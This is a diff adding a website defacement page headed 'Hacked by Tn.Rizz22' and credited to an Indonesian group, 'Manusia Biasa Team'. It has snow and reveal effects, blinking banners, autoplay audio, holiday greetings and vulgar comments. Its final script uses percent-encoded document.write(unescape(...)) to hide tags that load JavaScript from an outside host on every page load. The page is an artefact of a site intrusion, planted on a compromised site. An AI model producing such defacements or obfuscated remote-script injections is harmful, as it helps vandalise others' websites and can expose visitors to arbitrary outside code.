@@ -1,0 +1,305 @@
+<!--Tn.Rizz22 Gans sangadd unchhh :*-->
+<!-- Kini Kau Pergi Dari Ku Taruh ALASAN AMBIGUU !! -->
+<!-- Jan Recode KONTOL SUSAH W Bikin :( W kan NUUB  -->
+<html>
+<head><script type="text/javascript">
+       alert ("Hello !! Please Patch Your Website!:v")
+       alert ("Tn.Rizz22 Gans Tq")
+</script>
+</center>
+<span id="sec"><div id="foter" class="foter" style="position: fixed; top: 75px; left: -235px; width: 600px; padding: 10px; font-size: 16px; text-align: center; color: rgb(255, 255, 255); font-family: 'trebuchet ms', verdana, arial, sans-serif;transform: rotate(-45deg);transform-origin: 50% 0px;-o-transform: rotate(-45deg); -o-transform-origin: 50% 0px;-moz-transform: rotate(-45deg); -moz-transform-origin: 50% 0px; -webkit-transform: rotate(-45deg); -webkit-transform-origin: 50% 0px; background-color: rgb(0, 0, 0); border: 1px solid rgb(170, 170, 170); z-index: 9999; opacity: 0.5;">
+<b><font face="trade Winds" size="4"><marquee direction="left" scrollamount="6" width="50%">Copyright © 2019 by Tn.Rizz22 - good little hacktivist </marquee></font></b></div></span>
+</style>
+<script type='text/javascript'>
+var snowmax=35
+var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF")
+var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")
+var snowletter="*"
+var sinkspeed=0.6
+var snowmaxsize=22
+var snowminsize=8
+var snowingzone=1
+
+// Do not edit below this line
+var snow=new Array()
+var marginbottom
+var marginright
+var timer
+var i_snow=0
+var x_mv=new Array();
+var crds=new Array();
+var lftrght=new Array();
+var browserinfos=navigator.userAgent 
+var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
+var ns6=document.getElementById&&!document.all
+var opera=browserinfos.match(/Opera/)  
+var browserok=ie5||ns6||opera
+
+function randommaker(range) {		
+	rand=Math.floor(range*Math.random())
+    return rand
+}
+
+function initsnow() {
+	if (ie5 || opera) {
+		marginbottom = document.body.clientHeight
+		marginright = document.body.clientWidth
+	}
+	else if (ns6) {
+		marginbottom = window.innerHeight
+		marginright = window.innerWidth
+	}
+	var snowsizerange=snowmaxsize-snowminsize
+	for (i=0;i<=snowmax;i++) {
+		crds[i] = 0;                      
+    	lftrght[i] = Math.random()*15;         
+    	x_mv[i] = 0.03 + Math.random()/10;
+		snow[i]=document.getElementById("s"+i)
+		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
+		snow[i].size=randommaker(snowsizerange)+snowminsize
+		snow[i].style.fontSize=snow[i].size
+		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
+		snow[i].sink=sinkspeed*snow[i].size/5
+		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
+		snow[i].style.left=snow[i].posx
+		snow[i].style.top=snow[i].posy
+	}
+	movesnow()
+}
+
+function movesnow() {
+	for (i=0;i<=snowmax;i++) {
+		crds[i] += x_mv[i];
+		snow[i].posy+=snow[i].sink
+		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
+		snow[i].style.top=snow[i].posy
+		
+		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
+			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+			snow[i].posy=0
+		}
+	}
+	var timer=setTimeout("movesnow()",50)
+}
+
+for (i=0;i<=snowmax;i++) {
+	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
+}
+if (browserok) {
+	window.onload=initsnow
+}
+</script>
+<script type="text/javascript">
+var width=document.body.clientWidth;
+var height=document.body.clientHeight;
+
+function doClickText(who,type,step,timeOut) {
+document.getElementById(who).style.display="none";
+if(type==0) {
+reveal('revealDiv1',step,timeOut,0);
+reveal('revealDiv2',step,timeOut,1);}
+if(type==1) {
+reveal('revealDiv1',step,timeOut,2);
+reveal('revealDiv2',step,timeOut,3);}}
+function reveal(who,step,timeOut,type) {
+if(type==0)
+var where="top";
+if(type==1)
+var where="bottom";
+if(type==2)
+var where="left";
+if(type==3)
+var where="right";
+eval('var temp=document.getElementById(who).style.'+where);
+temp=parseInt(temp);
+if(type==0||type==1)
+var checkWith=height/2;
+if(type==2||type==3)
+var checkWith=width/2;
+if(-temp<checkWith) {
+
+temp-=step;
+
+eval('document.getElementById(who).style.'+where+'=temp;');
+
+setTimeout("reveal('"+who+"',"+step+",'"+timeOut+"',"+type+")", timeOut);}
+
+else {
+
+document.getElementById(who).style.display="none";
+
+document.body.scroll="yes";}}
+
+function initReveal(type,div1bg,div2bg,div1bw,div2bw,div1bc,div2bc,step,timeOut,click) {
+
+if(type==0) {
+
+var bWhere1="border-bottom";
+
+var bWhere2="border-top";
+
+var putZero1="top:0px; left:0px";
+
+var putZero2="bottom:0px; left:0px";
+
+document.write('<div id="revealDiv1" style="z-index:100; display:block; position:absolute; '+putZero1+'; background:'+div1bg+' ; width:'+(width)+'; height:'+(height/2)+'; '+bWhere1+':'+div1bc+' solid '+div1bw+'px"></div>');
+document.write('<div id="revealDiv2" style="z-index:100; display:block; position:absolute; '+putZero2+'; background:'+div2bg+' ; width:'+(width)+'; height:'+(height/2)+'; '+bWhere2+':'+div2bc+' solid '+div2bw+'px"></div>');
+if(!click) {
+reveal('revealDiv1',step,timeOut,0);
+reveal('revealDiv2',step,timeOut,1);}
+
+else {
+clickText(type,step,timeOut);}}
+
+if(type==1) {
+var bWhere1="border-right";
+var bWhere2="border-left";
+var putZero1="top:0px; left:0px";
+var putZero2="top:0px; right:0px";
+document.write('<div id="revealDiv1" style="z-index:100; display:block; position:absolute; '+putZero1+'; background:'+div1bg+' ; width:'+(width/2)+'; height:'+(height)+'; '+bWhere1+':'+div1bc+' solid '+div1bw+'px"></div>');
+document.write('<div id="revealDiv2" style="z-index:100; display:block; position:absolute; '+putZero2+'; background:'+div2bg+' ; width:'+(width/2)+'; height:'+(height)+'; '+bWhere2+':'+div2bc+' solid '+div2bw+'px"></div>');
+if(!click) {
+reveal('revealDiv1',step,timeOut,2);
+reveal('revealDiv2',step,timeOut,3);}
+else {
+clickText(type,step,timeOut);}}
+function clickText(type,step,timeOut) {
+document.write('<div id="clickText" style="z-index:101; display:block; position:absolute; top:'+(height/2-clickh/2-clickb)+'; left:'+(width/2-clickw/2-clickb)+'; left:'+(width/2-clickw/2-clickb)+'"><table style="border:'+clickc+' solid '+clickb+'px; background:'+clickbg+' ;width:'+clickw+'px; height:'+clickh+'; '+clickFont+'; cursor:hand; cursor:pointer" onClick="doClickText(\'clickText\','+type+','+step+','+timeOut+')"><tr><td align="middle">'+clickt+'</td></tr></table></div>');}}</SCRIPT><SCRIPT>
+var clickw=270;
+var clickh=20;
+var clickb=2;
+var clickc="white";
+var clickbg="white"; 
+var clickt="[+] <blink>welcome to Tn.Rizz22.html</blink>  [+]"; 
+var clickFont="font-family:Tahoma,arial,helvetica; font-size:10pt; font-weight:bold; color:red"; 
+new initReveal(0,'black','black',1,1,'aqua','aqua',3,10,true);
+</script>
+<link href="https://fonts.googleapis.com/css?family=Fredericka+the+Great|Kaushan+Script|Press+Start+2P|Rationale" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Dokdo|Gloria+Hallelujah|Indie+Flower|Permanent+Marker" rel="stylesheet">
+<title>Hacked by Tn.Rizz22</title>
+<link rel="icon" type="_image/png" href="https://data.whicdn.com/images/307874935/large.jpg">
+</head>
+<body>
+<center>
+<div align=center>
+<table width="100%" height="100%"><td align="center">
+<img src="https://media.giphy.com/media/MJttD4oi3Hg4M/giphy.gif" width="400px" height="400px"></a>
+<style type="text/css"> body{ background:url(https://i.ibb.co/GFvgf49/Logopit-1557391797938.jpg)
+}
+img:hover {
+opacity: 1.0;filter: alpha(opacity=100);
+}
+@keyframes rotate{
+10% {transform:rotateY(36deg)}
+20% {transform:rotateY(72deg)}
+30% {transform:rotateY(108deg)}
+40% {transform:rotateY(144deg)}
+50% {transform:rotateY(180deg)}
+60% {transform:rotateY(216deg)}
+70% {transform:rotateY(252deg)}
+80% {transform:rotateY(288deg)}
+90% {transform:rotateY(324deg)}
+100% {transform:rotateY(360deg)}
+}
+</style>
+<center>
+<table height="100%" width="100%">
+<style typecss="[{Tn.Rizz22 Ganss Sangadd !!}]">
+  #highlight{font:bold 100px Permanent Marker;}</style>
+
+<span class="blinking"><font face="Shadows Into Light Two" font="" size="7">~[]Tn.Rizz22[]~<br>ft Admin Of Manusia Biasa Team</font></span> 
+       <style type="text/css">BODY{cursor:none}</style> 
+      </div> <font face="Shadows Into Light Two"> 
+       <center> 
+        <style type="text/css">BODY{cursor:none}</style> 
+        <style type="text/css"> .blinking{ animation:blinkingText 0.8s infinite; } @keyframes blinkingText{ 0%{ color: #ff0027; } 20%{ color: #0c00ff; } 40%{ color: white; } 	60%{ color: #00e800; } 	80%{ color: red; } 100%{ color: #d0ff00; } } </style><br>
+
+<script language="javascript" type="text/javascript">
+     var teks="Manusia Biasa Team"
+     var speed=1
+
+if (document.all||document.getElementById) {
+     document.write('<span id="highlight">' + teks + '</span>')
+     var storetext=document.getElementById? document.getElementById("highlight") :
+document.all.highlight
+} else document.write(text)
+var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")
+
+var r=1
+var g=1
+var b=1
+var seq=1
+
+function changetext() {
+     rainbow="#"+hex[r]+hex[g]+hex[b]
+     storetext.style.color=rainbow
+}
+
+function change() {
+if (seq==6) {
+b--
+if (b==0)
+seq=1
+}
+if (seq==5) {
+r++
+if (r==12)
+seq=6
+}
+if (seq==4) {
+g--
+if (g==0)
+seq=5
+}
+if (seq==3) {
+b++
+if (b==12)
+seq=4
+}
+if (seq==2) {
+r--
+if (r==0)
+seq=3
+}
+if (seq==1) {
+g++
+if (g==12)
+seq=2
+}
+changetext()
+}
+
+function starteffect() {
+     if (document.all||document.getElementById)
+     flash=setInterval("change()",speed)
+}
+starteffect()
+</script>
+<br><center>
+
+<span class="blinking"><font face="Shadows Into Light Two" font="" size="7"> Manusia Biasa Team<br>Nama Boleh Biasa<br>Tetapi Skill Harus Luar Biasa<br>Salam Indonesian People<br>Little Hacktivist From MBT</font></span> 
+       <style type="text/css">BODY{cursor:none}</style>
+      </div> <font face="Shadows Into Light Two"> 
+       <center> 
+        <style type="text/css">BODY{cursor:none}</style> 
+        <style type="text/css"> .blinking{ animation:blinkingText 0.8s infinite; } @keyframes blinkingText{ 0%{ color: #ff0027; } 20%{ color: #0c00ff; } 40%{ color: white; } 	60%{ color: #00e800; } 	80%{ color: red; } 100%{ color: #d0ff00; } } </style>
+<br>
+<font size="15"><font color="black"><font face="Kaushan Script"><u><font color='#FF0059'><font size="">S</font><font color='#FF0007'>p</font><font color='#FF4900'>e</font><font color='#FF8C00'>c</font><font color='#FED200'>i</font><font color='#D6FF00'>a</font><font color='#87FE00'>l</font><font color='#36FF00'> </font><font color='#00FF2C'>T</font><font color='#00FF7F'>h</font><font color='#00FFCC'>a</font><font color='#00DBFF'>n</font><font color='#0093FF'>k</font><font color='#0051FE'>s</font><font color='#0002FF'> </font><font color='#5000FF'>T</font><font color='#9E00FF'>o</font></u></font></p>
+<audio autoplay="autoplay" controls="autoplay" src="https://api.soundcloud.com/tracks/330823518/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" type="audio/mpeg"></audio>
+</br>
+<br>
+<div style="text-align:center;font-size:36px;font-Cooper Hewitt:Kaushan Script;"><font color="aqua"><marquee direction="left" bgcolor="red" scrollamount="10">KAMI DARI MANUSIA BIASA TEAM MENGUCAPKAN</font></marquee><br><marquee direction="right" bgcolor="white"scrollamount="11"><font color="aqua"> MINAL AIDIN WAL FAIZIN </font><font color="aqua"> [•MOHON MAAF LAHIR DAN BATIN•]</font></marquee>
+<br>
+<script Language='Javascript'>
+<!--
+document.write(unescape('%3C%73%74%79%6C%65%20%74%79%70%65%3D%22%74%65%78%74%2F%63%73%73%22%3E%68%74%6D%6C%2C%62%6F%64%79%7B%68%65%69%67%68%74%3A%31%30%30%25%3B%6D%61%72%67%69%6E%3A%30%3B%70%61%64%64%69%6E%67%3A%30%7D%75%6C%2C%6C%69%7B%74%65%78%74%2D%69%6E%64%65%6E%74%3A%30%3B%74%65%78%74%2D%64%65%63%6F%72%61%74%69%6F%6E%3A%6E%6F%6E%65%3B%6D%61%72%67%69%6E%3A%30%3B%70%61%64%64%69%6E%67%3A%30%7D%69%6D%67%7B%62%6F%72%64%65%72%3A%30%7D%62%6F%64%79%7B%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%23%30%30%30%3B%63%6F%6C%6F%72%3A%23%39%39%39%3B%66%6F%6E%74%3A%31%30%30%25%2F%31%38%70%78%20%68%65%6C%76%65%74%69%63%61%2C%61%72%69%61%6C%2C%73%61%6E%73%2D%73%65%72%69%66%7D%63%61%6E%76%61%73%7B%63%75%72%73%6F%72%3A%63%72%6F%73%73%68%61%69%72%3B%64%69%73%70%6C%61%79%3A%62%6C%6F%63%6B%3B%6C%65%66%74%3A%30%3B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%30%3B%7A%2D%69%6E%64%65%78%3A%32%30%7D%23%68%65%61%64%65%72%20%69%6D%67%7B%77%69%64%74%68%3A%31%30%30%25%3B%68%65%69%67%68%74%3A%32%30%25%7D%23%62%67%20%69%6D%67%7B%77%69%64%74%68%3A%31%30%30%25%3B%68%65%69%67%68%74%3A%38%30%25%7D%23%68%65%61%64%65%72%2C%23%62%67%7B%70%6F%73%69%74%69%6F%6E%3A%66%69%78%65%64%3B%6C%65%66%74%3A%30%3B%72%69%67%68%74%3A%30%3B%7A%2D%69%6E%64%65%78%3A%31%30%7D%23%68%65%61%64%65%72%7B%74%6F%70%3A%30%7D%23%62%67%7B%70%6F%73%69%74%69%6F%6E%3A%66%69%78%65%64%3B%7A%2D%69%6E%64%65%78%3A%31%3B%62%6F%74%74%6F%6D%3A%30%7D%61%75%64%69%6F%7B%70%6F%73%69%74%69%6F%6E%3A%66%69%78%65%64%3B%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%3B%62%6F%74%74%6F%6D%3A%30%3B%6C%65%66%74%3A%30%3B%72%69%67%68%74%3A%30%3B%77%69%64%74%68%3A%31%30%30%25%3B%7A%2D%69%6E%64%65%78%3A%35%7D%2E%77%65%62%64%65%73%69%67%6E%7B%77%69%64%74%68%3A%33%30%25%3B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%30%3B%6C%65%66%74%3A%30%3B%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%74%61%68%6F%6D%61%3B%74%65%78%74%2D%64%65%63%6F%72%61%74%69%6F%6E%3A%6E%6F%6E%65%3B%63%6F%6C%6F%72%3A%23%32%33%32%33%32%33%3B%66%6F%6E%74%2D%73%69%7A%65%3A%31%31%70%78%7D%2E%77%65%62%64%65%73%69%67%6E%32%7B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%30%3B%72%69%67%68%74%3A%30%3B%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%74%61%68%6F%6D%61%3B%74%65%78%74%2D%64%65%63%6F%72%61%74%69%6F%6E%3A%6E%6F%6E%65%3B%63%6F%6C%6F%72%3A%23%32%33%32%33%32%33%3B%66%6F%6E%74%2D%73%69%7A%65%3A%31%31%70%78%7D%23%62%67%69%6D%67%7B%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%7D%23%62%67%69%6D%67%31%7B%64%69%73%70%6C%61%79%3A%62%6C%6F%63%6B%7D%40%6D%65%64%69%61%20%73%63%72%65%65%6E%20%61%6E%64%20%28%6D%61%78%2D%77%69%64%74%68%3A%35%30%30%70%78%29%7B%23%62%67%69%6D%67%31%7B%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%7D%23%62%67%69%6D%67%7B%64%69%73%70%6C%61%79%3A%62%6C%6F%63%6B%7D%7D%3C%2F%73%74%79%6C%65%3E%0A'));
+document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%70%61%72%73%69%63%6F%2E%6E%65%74%2F%70%61%67%65%73%2F%66%77%2F%73%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%70%61%72%73%69%63%6F%2E%6E%65%74%2F%70%61%67%65%73%2F%66%77%2F%66%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E'));
+//-->
+</Script>
